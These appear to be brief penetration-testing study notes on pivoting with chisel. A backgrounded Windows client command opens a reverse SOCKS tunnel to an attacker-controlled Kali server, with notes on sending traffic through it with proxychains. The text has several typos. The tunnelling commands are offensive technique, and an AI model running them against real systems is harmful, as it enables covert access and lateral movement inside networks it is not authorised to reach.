start /b chisel.exe client <localip>:8080 R:socks

::This command will start the chisel client on background to not block the current session shell.

./chisel server -p 8080 --reverse

::This command on our Kali will open the HTTP tunel through port 8080.

::Then, in order to use programas or send data over the HTTP tunel we have to use a tool like proxychains.

:: So, while chisel start a HTTP tunel forwarding redirecting packets that land on a port on our local machine. Proxychains redirect the data developed by other tool over the address configured on the botton of the /etc/proxychains4.conf file. So this address must be the gate to the HTTP tunel and it can vair un function in how the tunnel is configured, it could be an address in a local machine or in a target machine and it must configured properly.
